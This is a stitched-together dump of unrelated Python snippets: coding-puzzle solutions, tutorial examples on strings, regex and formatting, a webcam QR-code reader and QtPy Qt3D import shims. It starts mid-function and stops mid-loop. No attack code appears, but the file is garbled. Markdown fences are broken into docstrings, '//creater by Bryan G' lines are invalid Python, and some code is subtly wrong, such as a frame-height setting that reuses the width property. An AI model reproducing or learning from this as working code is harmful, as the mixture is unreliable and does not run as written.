            elif num % 2 != 0:
                return False
            else:
                num += val

        return True

for _ in range(int(input())):
    p = input()
    stack = []
    isBalanced = True
    for i in p:
        if i == "{":
            stack.append("}")
        elif i == "[":
            stack.append("]")
        elif i == "(":
            stack.append(")")
        else:
            if stack and i == stack.pop():
                continue
            else:
                isBalanced = False
                break
    if not isBalanced or stack:
        print("not balanced")
    else:
        print("balanced")

class Solution:
    # @param A : integer
    # @return a list of list of integers
    def solve(self, A):
        pas = []
        if A == 0:
            pas = []
        elif A == 1:
            pas = [[1]]
        elif A == 2:
            pas = [[1], [1, 1]]
        else:
            pas = [[1], [1, 1]]
            for i in range(2, A):
                pas.append([1])
                for j in range(1, i):
                    pas[i].append(pas[i - 1][j - 1] + pas[i - 1][j])
                pas[i].append(1)
        return pas

# Let's call an array A a mountain if the following properties hold:
#
# A.length >= 3
# There exists some 0 < i < A.length - 1 such that
# A[0] < A[1] < ... A[i-1] < A[i] > A[i+1] > ... > A[A.length - 1]
# Given an array that is definitely a mountain, return any i
# such that A[0] < A[1] < ... A[i-1] < A[i] > A[i+1] > ... > A[A.length - 1].

# Example 1:
#
# Input: [0,1,0]
# Output: 1
# Example 2:
#
# Input: [0,2,1,0]
# Output: 1


class Solution:
    def peakIndexInMountainArray(self, A):

        l = 0
        r = len(A) - 1

        while l <= r:
            m = l + (r - l) // 2
            if m >= 1 and A[m] > A[m - 1] and A[m] > A[m + 1]:
                return m
            elif A[m] > A[m - 1]:
                l = m + 1
            else:
                r = m - 1

for T in range(int(input())):
    N = int(input())
    S = input()
    ca = 0
    cb = 0
    na = N
    nb = N
    ans = True
    for i in range(len(S)):
        if i % 2 != 0:
            if S[i] == "1":
                ca += 1
                na -= 1
            else:
                na -= 1
        else:
            if S[i] == "1":
                cb += 1
                nb -= 1
            else:
                nb -= 1
        if (ca + na) < cb or (cb + nb) < ca:
            print(i + 1)
            ans = True
            break
        else:
            ans = False
    if ans == False:
        print(2 * N)

def iLoveDiscount(discount, mp):  # mp is market price
    discountPerc = discount / mp * 100
    return "Discount is " + str(discountPerc) + "%"


print("Hello\n")
print("Press Enter to exit")
while (
    True
):  # I've put counting discount in a loop cause if you want to count on multiple items
    more = str(input("Count or End : "))
    if more == "Count":
        disCount = float(input("Discount : "))
        marketPrice = float(input("Market Price : "))
        print(iLoveDiscount(disCount, marketPrice))
        continue
    else:
        quit()
```

````py
This first solution uses the interval splitting method
This is achieved by using a dp table.
Time Complexity: O(n^1.5)```


```py


class Solution1:
    def numSquares(self, n) -> int:
        if n <= 3:
            return n
        dp = [0 for _ in range(n + 1)]
        dp[1], dp[2], dp[3] = 1, 2, 3
        for i in range(4, len(dp)):
            dp[i] = i
            j = 1
            while j * j <= i:
                dp[i] = min(dp[i], 1 + dp[i - j * j])
                j += 1
        return dp[-1]

````

````py
Lagrange's 4 square and 3 square theorem

Theorem: Every natural number can be represented as the sum of 4 integer squares.
N = a^2 + b^2 + c^2 + d^2

Theorem: A natural number can be represented as sum of 3 squares of integers.
N = a^2 + b^2 + c^2

if and only if the N is not of the form,

N = 4^a (8b + 7) -- (1)

LOGIC:
- if N is a perfect square, return 1
- if N is of form (1),
    - keep dividing by 4
    - divide by 8
        - if rem == 7:
            return 4
- check if N can be split into two perfect squares. If yes, return 2
- if all fails, return 3```


```py


class Solution:
    def numSquares(self, n: int) -> int:
        if ceil(sqrt(n)) == floor(sqrt(n)):
            return 1

        while n % 4 == 0:
            n /= 4
        if n % 8 == 7:
            return 4

        j = 1
        while j * j <= n:
            if ceil(sqrt(n - j * j)) == floor(sqrt(n - j * j)):
                return 2
            j += 1

        else:
            return 3

class Solution:
    def stringShift(self, s: str, shift: List[List[int]]) -> str:
        amount = 0
        for i in range(len(shift)):
            if shift[i][0] == 0:
                amount += (-1) * shift[i][1]
            else:
                amount += 1 * shift[i][1]
        print(amount)
        if amount == 0:
            return s
        elif amount < 0:
            return s[(abs(amount) % len(s)) :] + s[0 : (abs(amount) % len(s))]
        else:
            return s[len(s) - (amount % len(s)) :] + s[0 : len(s) - (amount % len(s))]

def growingPlant(upSpeed, downSpeed, desiredHeight):
    day_count = 0
    height = 0
    while height <= desiredHeight:
        height = height + upSpeed
        day_count += 1
        if height < desiredHeight:
            height = height - downSpeed
        else:
            return day_count

class Solution:
    def plusOne(self, digits: List[int]) -> List[int]:
        carry = 0
        for i in range(len(digits) - 1, -1, -1):
            if digits[i] != 9:
                digits[i] += 1
                break
            else:
                digits[i] = 0
                if i == 0:
                    digits.insert(0, 1)
        return digits

def twoPointerSum(nums, target):
    """
    Given a sorted array of integers, return indices of the two numbers such that they add up to a specific target.
    You may assume that each input would have exactly one solution, and you may not use the same element twice.
    """
    l = 0
    r = len(nums) - 1
    while l < r:
        if nums[l] + nums[r] == target:
            return [l, r]
        elif nums[l] + nums[r] > target:
            r -= 1
        else:
            l += 1


nums = [5, 25, 75]
target = 100
print(twoPointerSum(nums, target))

def power(n):
    return n != 0 and ((n & (n - 1)) == 0)


def main():
    for i in range(int(input())):
        n = int(input())
        if n == 1:
            print(1)
            continue
        elif n == 3:
            print("1 3 2")
            continue
        elif n == 5:
            print("2 3 1 5 4")
            continue
        elif power(n):
            print(-1)
            continue
        else:
            print("2 3 1 5 4")
            i = 6
            while i <= n:
                if power(i):
                    print(str(i + 1) + " " + str(i), end=" ")
                    i += 2
                else:
                    print(i)
                    i += 1
            print("\n")


main()

class Solution:
    def isPowerOfThree(self, n: int) -> bool:
        if n < 1:
            return False
        if n == 1:
            return True
        if sum(list(map(int, str(n)))) % 3 != 0:
            return False
        else:
            while n > 1:
                if n % 3 == 0:
                    n /= 3
                else:
                    return False
        if n != 1:
            return False
        else:
            return True


# Alternate Approach
class Solution:
    def isPowerOfThree(self, n: int) -> bool:
        if n < 1:
            return False
        else:
            return 1162261467 % n == 0

# Classic Solution
class Solution:
    def isPowerOfTwo(self, n: int) -> bool:
        if n == 1:
            return True
        if n == 0:
            return False
        while n % 2 == 0:
            n = n / 2
        if n == 1:
            return True
        else:
            return False


# Solution Using Bit Manipulation
class Solution:
    def isPowerOfTwo(self, n: int) -> bool:
        return n > 0 and bin(n).count("1") == 1

# def gasPrediction(driveDistances, currentGasLevel, avgMileage):
#     a = sum(driveDistances) / 12 / avgMileage
#     print(a)
#     if a > currentGasLevel:
#         return True
#     else:
#         return False

# d, c, a = eval(dir()[0])
# return sum(d) / 12 / a > c

# 39 chars
gasPrediction = lambda d, c, a: sum(d) / 12 / a > c

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def reversePrint(head):
    ans = []
    while head:
        ans.append(head.data)
        head = head.next
    for i in range(len(ans) - 1, -1, -1):
        print(ans[i])

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def printLinkedList(head):
    while True:
        print(head.data)
        head = head.next
        if not head:
            break

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the toys function below.
def toys(w):
    w = sorted(w)
    containers = 1
    x = w[0]
    for i in range(1, len(w)):
        if w[i] > (x + 4):
            x = w[i]
            containers += 1
    return containers


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    w = list(map(int, input().rstrip().split()))

    result = toys(w)

    fptr.write(str(result) + "\n")

    fptr.close()

import math


def main():
    N = int(input())
    Q = list(map(int, input().split()))
    I = list(map(int, input().split()))
    min = math.inf
    for i in range(N):
        if (I[i] // Q[i]) < min:
            min = I[i] // Q[i]
    print(min)


main()
````

````py Read input from STDIN. Print your output to STDOUT """
# Use input() to read input from STDIN and use print to write your output to STDOUT
import heapq


def main():
    # Write code here
    T = int(input())
    while T:
        N = int(input())
        G = list(map(int, input().split()))
        O = list(map(int, input().split()))
        heapq.heapify(G)
        heapq.heapify(O)
        c = 0
        for i in range(0, N):
            g = heapq.heappop(G)
            o = heapq.heappop(O)
            if g > o:
                c += 1
            else:
                heapq.heappush(O, o)
        print(c)
        T -= 1


main()

class Product:
    def __init__(self, name, price):
        self.name = name
        self.price = price

    def __str__(self):
        return f"{self.name}  £{self.price}"

# Product Sum
# Write a function that takes in a "special" array and returns its product sum.
# A "special" array is a non-empty array that contains either integers or other "special" arrays.
# The product sum of a "special" array is the sum of its elements, where "special" arrays inside
# it should be summed themselves and then multiplied by their level of depth. For example, the
# product sum of [x, y] is x + y; the product sum of [x, [y, z]] is x + 2y + 2z.


class Solution:
    def productSum(self, arr, depth):
        Sum = 0
        for element in arr:
            if type(element) is list:
                Sum += self.productSum(element, depth + 1)
            else:
                Sum += element
        return depth * Sum


if __name__ == "__main__":
    arr = [5, 2, [7, -1], 3, [6, [-13, 8], 4]]
    print(Solution().productSum(arr, 1))

def depositProfit(deposit, rate, threshold):
    year_count = 0
    while deposit < threshold:
        deposit = deposit + (deposit * (rate / 100))
        year_count += 1
    return year_count

def depositProfit(deposit, rate, threshold):
    i = 0
    while deposit < threshold:
        deposit += deposit * rate * 0.01
        i += 1
    return i

class Solution:
    def pushDominoes(self, dominoes):
        N = len(dominoes)
        force = [0] * N
        f = 0
        for i in range(N):
            if dominoes[i] == "L":
                f = 0
            elif dominoes[i] == "R":
                f = N
            else:
                f = max(f - 1, 0)
            force[i] += f

        for i in range(N - 1, -1, -1):
            if dominoes[i] == "L":
                f = N
            elif dominoes[i] == "R":
                f = 0
            else:
                f = max(f - 1, 0)
            force[i] -= f

        for i in range(N):
            if force[i] > 0:
                force[i] = "R"

            elif force[i] < 0:
                force[i] = "L"
            else:
                force[i] = "."

        return "".join(force)

if __name__ == "__main__":
    n = int(input())
if n % 2 != 0:
    print("Weird")
elif n % 2 == 0 and n in range(2, 5):
    print("Not Weird")
elif (n % 2 == 0) and n in range(6, 21):
    print("Weird")
elif n % 2 == 0 and n > 20:
    print("Not Weird")

if __name__ == "__main__":
    list = []
    N = int(input())
    for _ in range(N):
        inp = input().split()
        if inp[0] == "insert":
            list.insert(int(inp[1]), int(inp[2]))
            continue
        if inp[0] == "print":
            print(list)
            continue
        if inp[0] == "remove":
            list.remove(int(inp[1]))
            continue
        if inp[0] == "append":
            list.append(int(inp[1]))
            continue
        if inp[0] == "sort":
            list = sorted(list)
            continue
        if inp[0] == "pop":
            list.pop()
            continue
        if inp[0] == "reverse":
            list = list[::-1]
            continue

# A backslash followed by three integers will result in a octal value:
txt = "\110\145\154\154\157"
print(txt)

# A backslash followed by an 'x' and a hex number represents a hex value:
txt = "\x48\x65\x6c\x6c\x6f"
print(txt)

# A backslash followed by an 'x' and a hex number represents a hex value:
txt = "\x48\x65\x6c\x6c\x6f"
print(txt)

# A backslash followed by three integers will result in a octal value:
txt = "\110\145\154\154\157"
print(txt)

quantity = 3
itemno = 567
price = 49.95
myorder = "I want {} pieces of item {} for {} dollars."
print(myorder.format(quantity, itemno, price))

quantity = 3
itemno = 567
price = 49.95
myorder = "I want to pay {2} dollars for {0} pieces of item {1}."
print(myorder.format(quantity, itemno, price))

x = "awesome"


def myfunc():
    x = "fantastic"
    print("Python is " + x)


myfunc()

print("Python is " + x)

txt = "I love apples, apple are my favorite fruit"

x = txt.count("apple")

print(x)
//creater by Bryan G

txt = "I love apples, apple are my favorite fruit"

x = txt.count("apple", 10, 24)

print(x)
//creater by Bryan G

txt = "My name is Ståle"

print(txt.encode(encoding="ascii",errors="backslashreplace"))
print(txt.encode(encoding="ascii",errors="ignore"))
print(txt.encode(encoding="ascii",errors="namereplace"))
print(txt.encode(encoding="ascii",errors="replace"))
print(txt.encode(encoding="ascii",errors="xmlcharrefreplace"))
//creater by Bryan G

thisdict = {
  "brand": "Ford",
  "model": "Mustang",
  "year": 1964
}
thisdict.clear()
print(thisdict)
//creater by Bryan G

thisdict = {
  "brand": "Ford",
  "model": "Mustang",
  "year": 1964
}
del thisdict["model"]
print(thisdict)
//Creater By Bryan G

thisset = {"apple", "banana", "cherry"}

del thisset

print(thisset) #this will raise an error because the set no longer exists
//Creater By Bryan G

thisdict = {
  "brand": "Ford",
  "model": "Mustang",
  "year": 1964
}
thisdict.pop("model")
print(thisdict)
//Creater By Bryan G

thisset = {"apple", "banana", "cherry"}

x = thisset.pop()

print(x) #removed item

print(thisset) #the set after removal
//Creater By Bryan G

thisdict = {
  "brand": "Ford",
  "model": "Mustang",
  "year": 1964
}
thisdict.popitem()
print(thisdict)
//Creater By Bryan G

x = frozenset({"apple", "banana", "cherry"})

# display x:
print(x)

# display the data type of x:
print(type(x))

x = frozenset({"apple", "banana", "cherry"})

# display x:
print(x)

# display the data type of x:
print(type(x))

f = open("demofile2.txt", "a")
f.write("Now the file has more content!")
f.close()

#open and read the file after the appending:
f = open("demofile2.txt", "r")
print(f.read())
//Creater By Bryan G

f = open("demofile3.txt", "w")
f.write("Woops! I have deleted the content!")
f.close()

#open and read the file after the appending:
f = open("demofile3.txt", "r")
print(f.read())
//Creater By Bryan G

if 5 > 2:
 print("Five is greater than two!")
if 5 > 2:
        print("Five is greater than two!")
//Creater By Bryan G

def myfunc(n):
  return lambda a : a * n

mydoubler = myfunc(2)

print(mydoubler(11))
//Creater By Bryan G

def myfunc(n):
  return lambda a : a * n

mytripler = myfunc(3)

print(mytripler(11))
//Creater By Bryan G

def myfunc(n):
  return lambda a : a * n

mydoubler = myfunc(2)
mytripler = myfunc(3)

print(mydoubler(11))
print(mytripler(11))
//Creater By Bryan G

x = 5

print(x > 3 and x < 10)

# returns True because 5 is greater than 3 AND 5 is less than 10
//Creater By Bryan G

x = 5

print(not(x > 3 and x < 10))

# returns False because not is used to reverse the result
//Creater By Bryan G

x = 5

print(x > 3 and x < 10)

# returns True because 5 is greater than 3 AND 5 is less than 10
//Creater By Bryan G

x = ["apple", "banana"]

print("banana" in x)

# returns True because a sequence with the value "banana" is in the list
//Creater By Bryan G

x = ["apple", "banana"]

print("pineapple" not in x)

# returns True because a sequence with the value "pineapple" is not in the list
//Creater By Bryan G

# convert from int to float:
x = float(1)

# convert from float to int:
y = int(2.8)

# convert from int to complex:
z = complex(x)

print(x)
print(y)
print(z)

print(type(x))
print(type(y))
print(type(z))

import re

# Check if the string starts with "The" and ends with "Spain":

txt = "The rain in Spain"
x = re.search("^The.*Spain$", txt)

if x:
    print("YES! We have a match!")
else:
    print("No match")

import re

# Replace all white-space characters with the digit "9":

txt = "The rain in Spain"
x = re.sub("\s", "9", txt)
print(x)

import re

# The search() function returns a Match object:

txt = "The rain in Spain"
x = re.search("ai", txt)
print(x)

import re

txt = "The rain in Spain"

# Find all lower case characters alphabetically between "a" and "m":

x = re.findall("[a-m]", txt)
print(x)

import re

txt = "hello world"

# Check if the string ends with 'world':

x = re.findall("world$", txt)
if x:
    print("Yes, the string ends with 'world'")
else:
    print("No match")

import re

txt = "The rain in Spain falls mainly in the plain!"

# Check if the string contains "a" followed by exactly two "l" characters:

x = re.findall("al{2}", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "hello world"

# Search for a sequence that starts with "he", followed by two (any) characters, and an "o":

x = re.findall("he..o", txt)
print(x)

import re

txt = "The rain in Spain falls mainly in the plain!"

# Check if the string contains "ai" followed by 1 or more "x" characters:

x = re.findall("aix+", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "That will be 59 dollars"

# Find all digit characters:

x = re.findall("\d", txt)
print(x)

import re

txt = "hello world"

# Check if the string starts with 'hello':

x = re.findall("^hello", txt)
if x:
    print("Yes, the string starts with 'hello'")
else:
    print("No match")

import re

txt = "The rain in Spain falls mainly in the plain!"

# Check if the string contains "ai" followed by 0 or more "x" characters:

x = re.findall("aix*", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain falls mainly in the plain!"

# Check if the string contains either "falls" or "stays":

x = re.findall("falls|stays", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

# Search for an upper case "S" character in the beginning of a word, and print its position:

txt = "The rain in Spain"
x = re.search(r"\bS\w+", txt)
print(x.span())

import re

# The string property returns the search string:

txt = "The rain in Spain"
x = re.search(r"\bS\w+", txt)
print(x.string)

import re

# Search for an upper case "S" character in the beginning of a word, and print the word:

txt = "The rain in Spain"
x = re.search(r"\bS\w+", txt)
print(x.group())

import re

txt = "The rain in Spain"
x = re.search("\s", txt)

print("The first white-space character is located in position:", x.start())

import re

txt = "8 times before 11:45 AM"

# Check if the string has any + characters:

x = re.findall("[+]", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "8 times before 11:45 AM"

# Check if the string has any two-digit numbers, from 00 to 59:

x = re.findall("[0-5][0-9]", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "8 times before 11:45 AM"

# Check if the string has any digits:

x = re.findall("[0-9]", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if the string has any 0, 1, 2, or 3 digits:

x = re.findall("[0123]", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if the string has any characters between a and n:

x = re.findall("[a-n]", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "8 times before 11:45 AM"

# Check if the string has any characters from a to z lower case, and A to Z upper case:

x = re.findall("[a-zA-Z]", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if the string has any a, r, or n characters:

x = re.findall("[arn]", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if the string has other characters than a, r, or n:

x = re.findall("[^arn]", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if the string starts with "The":

x = re.findall("\AThe", txt)

print(x)

if x:
    print("Yes, there is a match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Return a match at every no-digit character:

x = re.findall("\D", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if the string ends with "Spain":

x = re.findall("Spain\Z", txt)

print(x)

if x:
    print("Yes, there is a match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if "ain" is present, but NOT at the beginning of a word:

x = re.findall(r"\Bain", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Return a match at every NON white-space character:

x = re.findall("\S", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Return a match at every NON word character (characters NOT between a and Z. Like "!", "?" white-space etc.):

x = re.findall("\W", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if the string contains any digits (numbers from 0-9):

x = re.findall("\d", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if the string contains any digits (numbers from 0-9):

x = re.findall("\d", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Return a match at every word character (characters from a to Z, digits from 0-9, and the underscore _ character):

x = re.findall("\w", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Check if "ain" is present at the beginning of a WORD:

x = re.findall(r"\bain", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

txt = "The rain in Spain"

# Return a match at every white-space character:

x = re.findall("\s", txt)

print(x)

if x:
    print("Yes, there is at least one match!")
else:
    print("No match")

import re

# Split the string at every white-space character:

txt = "The rain in Spain"
x = re.split("\s", txt)
print(x)

import re

# Split the string at the first white-space character:

txt = "The rain in Spain"
x = re.split("\s", txt, 1)
print(x)

import re

# Replace the first two occurrences of a white-space character with the digit 9:

txt = "The rain in Spain"
x = re.sub("\s", "9", txt, 2)
print(x)

quantity = 3
itemno = 567
price = 49
myorder = "I want {0} pieces of item number {1} for {2:.2f} dollars."
print(myorder.format(quantity, itemno, price))

quantity = 3
itemno = 567
price = 49
myorder = "I want {} pieces of item number {} for {:.2f} dollars."
print(myorder.format(quantity, itemno, price))

txt = "H\te\tl\tl\to"

print(txt)
print(txt.expandtabs())
print(txt.expandtabs(2))
print(txt.expandtabs(4))
print(txt.expandtabs(10))

# named indexes:
txt1 = "My name is {fname}, I'm {age}".format(fname="sanu", age=24)
# numbered indexes:
txt2 = "My name is {0}, I'm {1}".format("sannu", 24)
# empty placeholders:
txt3 = "My name is {}, I'm {}".format("sanu", 24)

print(txt1)
print(txt2)
print(txt3)

# named indexes:
txt1 = "My name is {fname}, I'm {age}".format(fname="sanu", age=24)
# numbered indexes:
txt2 = "My name is {0}, I'm {1}".format("sannu", 24)
# empty placeholders:
txt3 = "My name is {}, I'm {}".format("sanu", 24)
# empty placeholders:
txt4 = "My name is {}, I'm {}".format("sanu", 24)
print(txt1)
print(txt2)
print(txt3)
print(txt4)

# Use "b" to convert the number into binary format:

txt = "The binary version of {0} is {0:b}"

print(txt.format(5))

# To demonstrate, we insert the number 8 to set the available space for the value to 8 characters.

# Use "^" to center-align the value:

txt = "We have {:^8} chickens."
print(txt.format(49))

# Use "d" to convert a number, in this case a binary number, into decimal number format:

txt = "We have {:d} chickens."
print(txt.format(0b101))

# Use "f" to convert a number into a fixed point number, default with 6 decimals, but use a period followed by a number to specify the number of decimals:

txt = "The price is {:.2f} dollars."
print(txt.format(45))

# without the ".2" inside the placeholder, this number will be displayed like this:

txt = "The price is {:f} dollars."
print(txt.format(45))

# Use "F" to convert a number into a fixed point number, but display inf and nan as INF and NAN:

x = float("inf")

txt = "The price is {:F} dollars."
print(txt.format(x))

# same example, but with a lower case f:

txt = "The price is {:f} dollars."
print(txt.format(x))

# Use "x" to convert the number into Hex format:

txt = "The Hexadecimal version of {0} is {0:x}"

print(txt.format(255))

# Use "X" to convert the number into upper-case Hex format:

txt = "The Hexadecimal version of {0} is {0:X}"

print(txt.format(255))

# To demonstrate, we insert the number 8 to set the available space for the value to 8 characters.

# Use "<" to left-align the value:

txt = "We have {:<8} chickens."
print(txt.format(49))

# Use "o" to convert the number into octal format:

txt = "The octal version of {0} is {0:o}"

print(txt.format(10))

# Use "%" to convert the number into a percentage format:

txt = "You scored {:%}"
print(txt.format(0.25))

# Or, without any decimals:

txt = "You scored {:.0%}"
print(txt.format(0.25))

# To demonstrate, we insert the number 8 to specify the available space for the value.

# Use "=" to place the plus/minus sign at the left most position:

txt = "The temperature is {:=8} degrees celsius."

print(txt.format(-5))

# To demonstrate, we insert the number 8 to set the available space for the value to 8 characters.

# Use ">" to right-align the value:

txt = "We have {:>8} chickens."
print(txt.format(49))

# Use "e" to convert a number into scientific number format (with a lower-case e):

txt = "We have {:e} chickens."
print(txt.format(5))

# Use "E" to convert a number into scientific number format (with an upper-case E):

txt = "We have {:E} chickens."
print(txt.format(5))

# Use "E" to convert a number into scientific number format (with an upper-case E):

txt = "We have {:E} chickens."
print(txt.format(5))

# Use "," to add a comma as a thousand separator:

txt = "The universe is {:,} years old."

print(txt.format(13800000000))

# Use "-" to always indicate if the number is negative (positive numbers are displayed without any sign):

txt = "The temperature is between {:-} and {:-} degrees celsius."

print(txt.format(-3, 7))

# Use "+" to always indicate if the number is positive or negative:

txt = "The temperature is between {:+} and {:+} degrees celsius."

print(txt.format(-3, 7))

# Use "_" to add a underscore character as a thousand separator:

txt = "The universe is {:_} years old."

print(txt.format(13800000000))

# Use " " (a space) to insert a space before positive numbers and a minus sign before negative numbers:

txt = "The temperature is between {: } and {: } degrees celsius."

print(txt.format(-3, 7))

myDict = {"name": "John", "country": "Norway"}
mySeparator = "TEST"

x = mySeparator.join(myDict)

print(x)

txt = "Good night Sam!"

x = "mSa"
y = "eJo"
z = "odnght"

mytable = txt.maketrans(x, y, z)

print(txt.translate(mytable))

txt = "I could eat bananas all day, bananas are my favorite fruit"

x = txt.rpartition("bananas")

print(x)

txt = "apple, banana, cherry"

# setting the maxsplit parameter to 1, will return a list with 2 elements!
x = txt.rsplit(", ", 1)

print(x)

# note that the result has only 2 elements "apple, banana" is the first element, and "cherry" is the last.

txt = "apple#banana#cherry#orange"

# setting the maxsplit parameter to 1, will return a list with 2 elements!
x = txt.split("#", 1)

print(x)

# use a dictionary with ascii codes to replace 83 (S) with 80 (P):
mydict = {83: 80}

txt = "Hello Sam!"

print(txt.translate(mydict))

txt = "Good night Sam!"

mydict = {
    109: 101,
    83: 74,
    97: 111,
    111: None,
    100: None,
    110: None,
    103: None,
    104: None,
    116: None,
}

print(txt.translate(mydict))

txt = "Good night Sam!"

x = "mSa"
y = "eJo"
z = "odnght"

mytable = txt.maketrans(x, y, z)

print(txt.translate(mytable))

a = "hello"
b = "welcome to the jungle"
c = "10.000"

print(a.zfill(10))
print(b.zfill(10))
print(c.zfill(10))

#! /usr/bin/python3
import numpy as np
import pyperclip
import cv2
import sys
from pyzbar.pyzbar import decode


def webcamCap(inputD):

    # Webcam Capture
    capture_stream = cv2.VideoCapture(inputD)
    capture_stream.set(3, 640)
    capture_stream.set(3, 480)
    ans = ""
    while True:

        success, img = capture_stream.read()

        for code in decode(img):
            # Data in  code
            ans = code.data.decode("utf-8")
            # Coordinates of polygon over the QR code
            points = np.array([code.polygon], np.int32)
            points = points.reshape((-1, 1, 2))
            cv2.polylines(img, [points], True, (255, 0, 255), 5)

            # points for rectangle
            pts2 = code.rect
            cv2.putText(
                img,
                ans,
                (pts2[0], pts2[1]),
                cv2.FONT_HERSHEY_PLAIN,
                1.5,
                (255, 0, 255),
                thickness=2,
            )

        cv2.imshow("Result ", img)
        if cv2.waitKey(20) & 0xFF == ord("c"):
            print(ans)
            pyperclip.copy(ans)
            break


def imgCap(img):
    ans = ""

    img = cv2.imread(img)

    ans = decode(img)[0].data.decode("utf-8")
    stats = decode(img)[0]
    # Coordinates of polygon over the QR code
    points = np.array([stats.polygon], np.int32)
    points = points.reshape((-1, 1, 2))
    cv2.polylines(img, [points], True, (255, 0, 255), 5)

    # points for rectangle
    pts2 = stats.rect
    cv2.putText(
        img,
        ans,
        (pts2[0], pts2[1]),
        cv2.FONT_HERSHEY_PLAIN,
        1.5,
        (255, 0, 255),
        thickness=2,
    )
    while True:
        cv2.imshow("Result ", img)
        if cv2.waitKey(20) & 0xFF == ord("c"):
            print(ans)
            pyperclip.copy(ans)
            break


if __name__ == "__main__":
    if len(sys.argv) > 1:
        # Get subject from command line.
        img = sys.argv[1]
        imgCap(img)
    else:
        webcamCap(0)

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides Qt3DAnimation classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError, PYSIDE_VERSION
from .py3compat import PY2

if PYQT5:
    from PyQt5.Qt3DAnimation import *
elif PYSIDE2:
    if not PY2 or (PY2 and PYSIDE_VERSION < "5.12.4"):
        # https://bugreports.qt.io/projects/PYSIDE/issues/PYSIDE-1026
        import PySide2.Qt3DAnimation as __temp
        import inspect

        for __name in inspect.getmembers(__temp.Qt3DAnimation):
            globals()[__name[0]] = __name[1]
    else:
        raise PythonQtError("A bug in Shiboken prevents this")
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides Qt3DCore classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError, PYSIDE_VERSION
from .py3compat import PY2

if PYQT5:
    from PyQt5.Qt3DCore import *
elif PYSIDE2:
    if not PY2 or (PY2 and PYSIDE_VERSION < "5.12.4"):
        # https://bugreports.qt.io/projects/PYSIDE/issues/PYSIDE-1026
        import PySide2.Qt3DCore as __temp
        import inspect

        for __name in inspect.getmembers(__temp.Qt3DCore):
            globals()[__name[0]] = __name[1]
    else:
        raise PythonQtError("A bug in Shiboken prevents this")
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides Qt3DExtras classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError, PYSIDE_VERSION
from .py3compat import PY2

if PYQT5:
    from PyQt5.Qt3DExtras import *
elif PYSIDE2:
    if not PY2 or (PY2 and PYSIDE_VERSION < "5.12.4"):
        # https://bugreports.qt.io/projects/PYSIDE/issues/PYSIDE-1026
        import PySide2.Qt3DExtras as __temp
        import inspect

        for __name in inspect.getmembers(__temp.Qt3DExtras):
            globals()[__name[0]] = __name[1]
    else:
        raise PythonQtError("A bug in Shiboken prevents this")
else:
    raise PythonQtError("No Qt bindings could be found")

# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# Copyright © 2009- The Spyder Development Team
#
# Licensed under the terms of the MIT License
# (see LICENSE.txt for details)
# -----------------------------------------------------------------------------```


```pyProvides Qt3DInput classes and functions."""

# Local imports
from . import PYQT5, PYSIDE2, PythonQtError, PYSIDE_VERSION
from .py3compat import PY2

if PYQT5:
    from PyQt5.Qt3DInput import *
elif PYSIDE2:
    if not PY2 or (PY2 and PYSIDE_VERSION < "5.12.4"):
        # https://bugreports.qt.io/projects/PYSIDE/issues/PYSIDE-1026
        import PySide2.Qt3DInput as __temp
        import inspect

        for __name in inspect.getmembers(__temp.Qt3DInput):
